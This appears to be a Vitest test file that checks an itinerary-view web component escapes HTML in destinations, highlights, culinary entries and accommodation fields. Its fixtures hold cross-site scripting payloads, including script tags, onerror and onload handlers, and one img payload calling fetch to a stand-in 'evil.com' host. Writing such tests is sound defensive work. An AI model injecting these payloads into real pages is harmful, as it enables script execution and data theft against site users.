import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { Stop, CulinaryRegion, Accommodation } from '../types'
import { ItineraryView } from './ItineraryView'

// Mock IntersectionObserver which is not available in test environment
global.IntersectionObserver = class IntersectionObserver {
  constructor() {}
  disconnect() {}
  observe() {}
  unobserve() {}
  takeRecords() {
    return []
  }
} as any

describe('ItineraryView XSS Prevention', () => {
  let view: ItineraryView
  let container: HTMLDivElement

  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
    container = document.body

    view = new ItineraryView(
      vi.fn(),
      vi.fn(),
    )
  })

  it('escapes malicious stop destinations in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: '<img src=x onerror=alert(1)>',
        region: '<script>alert("XSS")</script>',
        coords: [0, 0] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Normal description',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<img src=x')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;img')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious highlights in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe description',
        highlights: [
          'Visit the castle',
          '"><script>alert(1)</script><span x="',
          '<img src=x onerror="fetch(\'https://evil.com\')">"',
        ],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const highlights = timeline?.querySelectorAll('.card-highlights li')
    expect(highlights?.length).toBe(3)
    expect(highlights?.[1]?.innerHTML).not.toContain('<script>')
    expect(highlights?.[1]?.innerHTML).toContain('&lt;script&gt;')
    expect(highlights?.[2]?.innerHTML).not.toContain('<img')
    expect(highlights?.[2]?.innerHTML).toContain('&lt;img')
  })

  it('escapes malicious culinary descriptions', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const culinary: CulinaryRegion[] = [
      {
        icon: '🍴',
        name: '<img src=x onerror=alert(1)>',
        region: 'Scania">alert(1)</div><div x="',
        desc: '<script>alert("food XSS")</script>',
        must: ['Meatballs', '"><script>alert(1)</script>'],
        color: 'rgb(0,0,0)',
      },
    ]

    view.render(stops, culinary, [])

    const grid = document.getElementById('cul-grid')
    expect(grid?.innerHTML).not.toContain('<img src=x')
    expect(grid?.innerHTML).not.toContain('<script>')
    expect(grid?.innerHTML).toContain('&lt;img')
    expect(grid?.innerHTML).toContain('&lt;script&gt;')

    const mustList = grid?.querySelector('.cul-list')
    expect(mustList?.innerHTML).not.toContain('<script>')
    expect(mustList?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious accommodation details', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const accommodations: Accommodation[] = [
      {
        dest: '<img src=x onerror=alert(1)>',
        type: 'Hotel"><script>alert(1)</script>',
        policy: 'free',
        bath: true,
        terrace: false,
        note: '<svg onload=alert(1)>',
      },
    ]

    view.render(stops, [], accommodations)

    const tbody = document.getElementById('accom-tbody')
    const cells = tbody?.querySelectorAll('td')
    expect(tbody?.innerHTML).not.toContain('<img src=x')
    expect(tbody?.innerHTML).not.toContain('<script>')
    expect(tbody?.innerHTML).not.toContain('<svg')
    expect(tbody?.innerHTML).toContain('&lt;img')
    expect(tbody?.innerHTML).toContain('&lt;svg')
  })

  it('escapes malicious from city in route info', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: '"><script>alert(1)</script>',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })
})
